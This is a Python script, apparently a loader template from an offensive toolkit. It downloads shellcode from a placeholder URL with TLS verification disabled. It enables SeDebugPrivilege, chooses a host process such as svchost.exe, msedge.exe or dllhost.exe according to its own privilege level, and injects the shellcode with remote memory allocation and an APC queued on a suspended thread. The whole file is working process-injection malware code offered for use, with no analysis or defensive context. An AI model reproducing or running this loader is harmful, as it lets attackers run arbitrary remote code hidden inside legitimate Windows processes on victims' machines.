exec(r'''
import ctypes, ssl, urllib.request, sys
import ctypes.wintypes as wintypes
from ctypes import wintypes, windll

# customize these if wanted :) if target_pid is filled it will ignore the priv and unpriv lists and ho for the target pid
unpriv_user = ["msedge.exe", "runtimebroker.exe", "svchost.exe"]
priv_user   = ["svchost.exe", "dllhost.exe"]
target_pid  = ""

MAX_PATH = 260
ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ssl_context.check_hostname = False; ssl_context.verify_mode = ssl.CERT_NONE
url = "%%url%%"
with urllib.request.urlopen(url, context=ssl_context) as r:
    shellcode = r.read()

shellcode_size = len(shellcode)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
ntdll   = ctypes.WinDLL("ntdll",   use_last_error=True)
if not shellcode_size:
    sys.exit("Error with download")

MEM_COMMIT   = 0x1000
MEM_RESERVE  = 0x2000
MEM_RELEASE  = 0x8000
PAGE_READWRITE    = 0x04
PAGE_EXECUTE_READ = 0x20
TH32CS_SNAPPROCESS = 0x00000002
INVALID_HANDLE_VALUE = wintypes.HANDLE(-1).value
PROCESS_ALL_ACCESS  = 0x1F0FFF
CREATE_SUSPENDED    = 0x00000004
PROC_PERMS = 0x043A

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [("dwSize", wintypes.DWORD), ("cntUsage", wintypes.DWORD), ("th32ProcessID", wintypes.DWORD), ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)), ("th32ModuleID", wintypes.DWORD), ("cntThreads", wintypes.DWORD), ("th32ParentProcessID", wintypes.DWORD), ("pcPriClassBase", ctypes.c_long), ("dwFlags", wintypes.DWORD), ("szExeFile", wintypes.WCHAR * MAX_PATH)]

CreateToolhelp32Snapshot = kernel32.CreateToolhelp32Snapshot; CreateToolhelp32Snapshot.argtypes = (wintypes.DWORD, wintypes.DWORD); CreateToolhelp32Snapshot.restype  = wintypes.HANDLE
Process32FirstW = kernel32.Process32FirstW; Process32FirstW.argtypes = (wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32)); Process32FirstW.restype  = wintypes.BOOL
Process32NextW = kernel32.Process32NextW; Process32NextW.argtypes = (wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32)); Process32NextW.restype  = wintypes.BOOL
OpenProcess = kernel32.OpenProcess; OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD); OpenProcess.restype  = wintypes.HANDLE
VirtualAllocEx = kernel32.VirtualAllocEx; VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD); VirtualAllocEx.restype  = wintypes.LPVOID
VirtualFreeEx = kernel32.VirtualFreeEx; VirtualFreeEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD); VirtualFreeEx.restype  = wintypes.BOOL
WriteProcessMemory = kernel32.WriteProcessMemory; WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)); WriteProcessMemory.restype  = wintypes.BOOL
CreateRemoteThread = kernel32.CreateRemoteThread; CreateRemoteThread.argtypes = (wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)); CreateRemoteThread.restype  = wintypes.HANDLE
CloseHandle = kernel32.CloseHandle; CloseHandle.argtypes = (wintypes.HANDLE,); CloseHandle.restype  = wintypes.BOOL
NtQueueApcThreadEx = ntdll.NtQueueApcThreadEx; NtQueueApcThreadEx.argtypes = (wintypes.HANDLE, wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, wintypes.ULONG); NtQueueApcThreadEx.restype = wintypes.LONG
NtAlertResumeThread = ntdll.NtAlertResumeThread; NtAlertResumeThread.argtypes = (wintypes.HANDLE, ctypes.POINTER(wintypes.ULONG)); NtAlertResumeThread.restype  = wintypes.LONG
RtlExitUserThread = ntdll.RtlExitUserThread; RtlExitUserThread_addr = ctypes.cast(RtlExitUserThread, ctypes.c_void_p).value
VirtualProtectEx = kernel32.VirtualProtectEx; VirtualProtectEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)); VirtualProtectEx.restype = wintypes.BOOL
QUEUE_SPEC_USER_APC = 0x1

def can_open_process(pid, access=PROC_PERMS):
    h = OpenProcess(access, False, pid)
    ret = bool(h)
    CloseHandle(h) if h else None
    return ret

def find_process_id_by_name(names):
    names = [n.lower() for n in names]
    found = {}
    s = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if s == INVALID_HANDLE_VALUE:
        return None
    try:
        pe32 = PROCESSENTRY32()
        pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
        if Process32FirstW(s, ctypes.byref(pe32)):
            while True:
                n = pe32.szExeFile.rstrip("\x00").lower()
                if n in names and n not in found and can_open_process(pe32.th32ProcessID):
                    found[n] = pe32.th32ProcessID
                if not Process32NextW(s, ctypes.byref(pe32)):
                    break
    finally:
        CloseHandle(s)
    for n in names:
        if n in found:
            return found[n]

def remote_via_apc(targets):
    pid = None
    for t in targets:
        if str(t).isdigit():
            p = int(t)
            if can_open_process(p):
                pid = p
                break
        else:
            p = find_process_id_by_name([t])
            if p:
                pid = p
                break
    if not pid:
        raise RuntimeError("Targeted process not found.")

    print(f"Found target process PID = {pid}")
    hp = OpenProcess(PROC_PERMS, False, pid)
    if not hp:
        raise OSError("OpenProcess failed.")

    mem = VirtualAllocEx(hp, None, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if not mem:
        CloseHandle(hp)
        raise MemoryError("VirtualAllocEx failed.")

    w = ctypes.c_size_t()
    if not WriteProcessMemory(hp, mem, shellcode, shellcode_size, ctypes.byref(w)):
        VirtualFreeEx(hp, mem, 0, MEM_RELEASE); CloseHandle(hp)
        raise MemoryError("WriteProcessMemory failed.")

    old_protect = wintypes.DWORD()
    if not VirtualProtectEx(hp, mem, shellcode_size, PAGE_EXECUTE_READ, ctypes.byref(old_protect)):
        VirtualFreeEx(hp, mem, 0, MEM_RELEASE); CloseHandle(hp)
        raise MemoryError("VirtualProtectEx failed to set RX.")

    thr = CreateRemoteThread(hp, None, 0, ctypes.c_void_p(RtlExitUserThread_addr), None, CREATE_SUSPENDED, None)
    if not thr:
        VirtualFreeEx(hp, mem, 0, MEM_RELEASE); CloseHandle(hp)
        raise OSError("CreateRemoteThread failed.")

    st = NtQueueApcThreadEx(thr, None, ctypes.c_void_p(mem), None, None, None, QUEUE_SPEC_USER_APC)
    if st != 0:
        CloseHandle(thr); CloseHandle(hp)
        raise OSError(f"NtQueueApcThreadEx failed NTSTATUS: 0x{st:08X}")

    NtAlertResumeThread(thr, None)
    print("APC queued and thread alerted")
    CloseHandle(thr); CloseHandle(hp)

advapi32, kernel32_tok = windll.advapi32, windll.kernel32
kernel32_tok.GetCurrentProcess.restype = wintypes.HANDLE
advapi32.OpenProcessToken.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
advapi32.OpenProcessToken.restype  = wintypes.BOOL
advapi32.ConvertSidToStringSidW.argtypes = [wintypes.LPVOID, ctypes.POINTER(wintypes.LPWSTR)]
advapi32.ConvertSidToStringSidW.restype  = wintypes.BOOL

def _tok(info_cls, cast_type=None):
    h = wintypes.HANDLE()
    if not advapi32.OpenProcessToken(kernel32_tok.GetCurrentProcess(), 0x8, ctypes.byref(h)):
        raise ctypes.WinError()
    sz = wintypes.DWORD()
    advapi32.GetTokenInformation(h, info_cls, None, 0, ctypes.byref(sz))
    buf = ctypes.create_string_buffer(sz.value)
    if not advapi32.GetTokenInformation(h, info_cls, buf, sz, ctypes.byref(sz)):
        raise ctypes.WinError()
    return (ctypes.cast(buf, cast_type).contents if cast_type
            else ctypes.cast(buf, ctypes.POINTER(wintypes.DWORD)).contents.value)

class _SID_ATTR(ctypes.Structure):
    _fields_ = [("Sid", wintypes.LPVOID), ("Attr", wintypes.DWORD)]

class _TML(ctypes.Structure):
    _fields_ = [("Label", _SID_ATTR)]

def integrity():
    tml = _tok(25, ctypes.POINTER(_TML))
    sid_ptr = wintypes.LPWSTR()
    if not advapi32.ConvertSidToStringSidW(tml.Label.Sid, ctypes.byref(sid_ptr)):
        raise ctypes.WinError()
    sid = sid_ptr.value
    kernel32_tok.LocalFree(sid_ptr)
    rid = int(sid.split('-')[-1])
    lvl = ("Untrusted" if rid<0x1000 else
           "Low"       if rid<0x2000 else
           "Medium"    if rid<0x3000 else
           "High"      if rid<0x4000 else
           "System"    if rid<0x5000 else
           "Protected")
    return lvl, sid

def elevated():
    return bool(_tok(20))

def etype():
    return {2:"Full",3:"Limited"}.get(_tok(18),"Default")

class LUID(ctypes.Structure):
    _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [("PrivilegeCount", wintypes.DWORD), ("Privileges", LUID_AND_ATTRIBUTES * 1)]

def enable_privilege(name="SeDebugPrivilege"):
    h = wintypes.HANDLE()
    if not advapi32.OpenProcessToken(kernel32_tok.GetCurrentProcess(), 0x20|0x8, ctypes.byref(h)):
        return False
    try:
        luid = LUID()
        if not advapi32.LookupPrivilegeValueW(None, name, ctypes.byref(luid)):
            return False
        tp = TOKEN_PRIVILEGES(1, (LUID_AND_ATTRIBUTES(luid, 0x2),))
        advapi32.AdjustTokenPrivileges(h, False, ctypes.byref(tp), 0, None, None)
        return ctypes.get_last_error() == 0
    finally:
        CloseHandle(h)

PROCESS_QUERY_LIMITED_INFORMATION = 0x1000

def get_process_integrity(pid):
    h_proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
    if not h_proc:
        return None
    try:
        h_tok = wintypes.HANDLE()
        if not advapi32.OpenProcessToken(h_proc, 0x8, ctypes.byref(h_tok)):
            return None
        try:
            sz = wintypes.DWORD()
            advapi32.GetTokenInformation(h_tok, 25, None, 0, ctypes.byref(sz))
            buf = ctypes.create_string_buffer(sz.value)
            if not advapi32.GetTokenInformation(h_tok, 25, buf, sz, ctypes.byref(sz)):
                return None
            tml = ctypes.cast(buf, ctypes.POINTER(_TML)).contents
            sid_ptr = wintypes.LPWSTR()
            if not advapi32.ConvertSidToStringSidW(tml.Label.Sid, ctypes.byref(sid_ptr)):
                return None
            sid_val = sid_ptr.value
            kernel32_tok.LocalFree(sid_ptr)
            rid = int(sid_val.split('-')[-1])
            return ("Untrusted" if rid<0x1000 else
                    "Low"       if rid<0x2000 else
                    "Medium"    if rid<0x3000 else
                    "High"      if rid<0x4000 else
                    "System"    if rid<0x5000 else
                    "Protected")
        finally:
            CloseHandle(h_tok)
    finally:
        CloseHandle(h_proc)

def pick_pid_from_list(proclist, only_high_svchost=False):
    for name in proclist:
        if only_high_svchost and name.lower() == "svchost.exe":
            s = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            if s == INVALID_HANDLE_VALUE:
                continue
            try:
                pe32 = PROCESSENTRY32()
                pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
                if Process32FirstW(s, ctypes.byref(pe32)):
                    while True:
                        pname = pe32.szExeFile.rstrip("\x00").lower()
                        if pname == "svchost.exe" and pe32.th32ProcessID > 1000:
                            if can_open_process(pe32.th32ProcessID):
                                print(f"[*] found 'svchost.exe' above PID 1000 => {pe32.th32ProcessID}")
                                CloseHandle(s)
                                return pe32.th32ProcessID
                        if not Process32NextW(s, ctypes.byref(pe32)):
                            break
            finally:
                CloseHandle(s)
        else:
            pid = find_process_id_by_name([name])
            if pid:
                print(f"[*] found '{name}' with pid={pid}")
                return pid
    return None

def find_all_svchost_pids():
    result = {}
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == INVALID_HANDLE_VALUE:
        return result
    try:
        pe32 = PROCESSENTRY32()
        pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
        if Process32FirstW(snap, ctypes.byref(pe32)):
            while True:
                if pe32.szExeFile.rstrip("\x00").lower() == "svchost.exe":
                    lvl = get_process_integrity(pe32.th32ProcessID)
                    if lvl:
                        result[pe32.th32ProcessID] = lvl
                if not Process32NextW(snap, ctypes.byref(pe32)):
                    break
    finally:
        CloseHandle(snap)
    return result

def pick_pid():
    if target_pid.strip():
        print(f"[*] Using user-specified PID: {target_pid}")
        return int(target_pid)

    me_lvl,_ = integrity()
    if elevated():
        print(f"[*] We appear to be elevated. Checking priv_user list: {priv_user}")
        pid = pick_pid_from_list(priv_user, only_high_svchost=True)
    else:
        print(f"[*] We appear to be non-elevated. Checking unpriv_user list: {unpriv_user}")
        pid = pick_pid_from_list(unpriv_user, only_high_svchost=False)

    return pid

if __name__ == "__main__":
    try:
        lvl, sid = integrity()
        print(f"[+] Integrity level : {lvl} ({sid})")
        print(f"[+] Token elevated  : {elevated()} (Type={etype()})")
        enable_privilege()

        pid = pick_pid()
        if not pid:
            raise RuntimeError("No suitable process from lists (or user-supplied PID) found.")

        remote_via_apc([str(pid)])

    except Exception as e:
        print(e, file=sys.stderr)
        sys.exit(1)

exit()
''')
